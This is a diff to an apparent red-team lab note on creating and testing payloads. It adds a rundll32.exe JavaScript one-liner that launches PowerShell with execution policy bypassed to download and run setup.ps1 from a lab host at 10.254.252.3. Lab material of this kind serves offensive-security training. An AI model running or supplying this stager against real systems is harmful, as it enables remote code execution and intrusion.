@@ -14,7 +14,11 @@ This lab will focus on creating multiple payloads and then testing them in the s
 
 #### *Payload:* Create Powershell Stager
 
-#### *Execution Technique:* Executing Stager with rundll32.exe
+#### *Execution Technique:* 
+```markdown
+# Executing Stager with rundll32.exe
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://10.254.252.3:8000/setup.ps1');")
+```
 
 ----
 ## [[SCT stager and execute with regsvr32.exe]]
